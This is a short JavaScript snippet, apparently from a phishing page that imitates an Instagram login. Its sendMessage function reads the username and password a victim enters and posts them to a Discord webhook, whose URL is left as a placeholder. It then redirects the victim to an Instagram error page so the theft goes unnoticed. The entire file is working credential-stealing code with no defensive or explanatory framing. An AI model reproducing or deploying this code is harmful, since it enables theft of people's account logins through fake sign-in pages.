webhook = 'Discord webhook linki'
    
function sendMessage() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    
    if (username.trim() === '' || password.trim() === '') {
        console.log("#");
    } else {
        var request = new XMLHttpRequest();
        request.open("POST", webhook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            content: ("> USERNAME  : " + document.getElementById('username').value + "\n> PASSWORD : " + document.getElementById('password').value)
        }
        request.send(JSON.stringify(params));
        window.location.href = 'https://www.instagram.com/error404/notfound/page';
    }
}